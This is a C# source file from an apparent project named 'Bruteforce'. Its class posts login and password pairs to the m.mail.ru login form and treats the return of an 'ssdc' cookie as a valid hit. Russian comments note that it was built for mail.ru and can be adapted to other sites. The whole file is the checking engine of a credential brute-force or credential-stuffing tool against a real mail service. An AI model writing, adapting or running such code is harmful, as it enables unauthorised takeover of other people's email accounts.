using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;
using System.Windows;
using HtmlAgilityPack;
using xNet;

namespace Bruteforce
{
    class GetPage
    {
        /*public string Token_Pars()
        {

            string directory = Environment.CurrentDirectory;
            string source = File.ReadAllText(directory + @"\html.txt");

                var doc = new HtmlDocument();
                doc.LoadHtml(source);
                try
                {
                    var value = doc.DocumentNode.SelectSingleNode("//input[@name='act_token']") // делал для mail.ru, поэтому парсит токена только с того сайта,
                        .Attributes["value"]                                                    // если кому то нужно, то переделает под себя получение токена.
                        .Value;
                    return value;
                }
                catch (Exception e)
                {
                MessageBox.Show("Ошибка при получении токена");
                return null;
                }
            
        }
        */
        public static CookieDictionary cook = new CookieDictionary();

            public static string Pars_Link(string page)
            => Regex.Match(page, "<form id=\"authform\" action=\"(.*)\" method=\"post\" class=\"p\">").Groups[1].ToString();

        public static string GET(string url = "https://m.mail.ru/login")
        {
            using (var request = new HttpRequest())
            {
                request.Cookies = cook;
                HttpResponse response = request.Get(url);
                return response.ToString();
            }
        }
        public bool Post_Auth(string login, string password) /*string token*/

        {
            using (var request = new HttpRequest())
            {
                cook.Clear();
                //string Domain = "mail.ru"; //домен по умолчанию mail.ru
                request.Cookies = cook;
                request.AddParam("post"); // добавляем параметры
                request.AddParam("mhost", "m.mail.ru");
                request.AddParam("login_from");
                request.AddParam("Login", login);
                request.AddParam("Domain");
                request.AddParam("Password", password);
                HttpResponse response = request.Post(Pars_Link(GET()));
                if (response.ContainsCookie("ssdc")) //при гуде будет кука с именем ssdc
                {
                    return true;
                }
                else //DBDBDBDBDBDBDBDB
                {
                    return false;
                }
            }
        }
        public static string GettingPage(string url)
        {
            try
            {
                string uri = url;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
                string page = reader.ReadToEnd();
                return page;
            }
            catch
            {
                MessageBox.Show("Введите корректную ссылку. " +
                                "Возможно, действие не доступно для неавторизованной данной программы на сайте," +
                                " или происходит переадресация.",
                                "Некорректная ссылка", 
                                MessageBoxButton.OK, 
                           MessageBoxImage.Error);
                return null;
            }
        }

    }

}
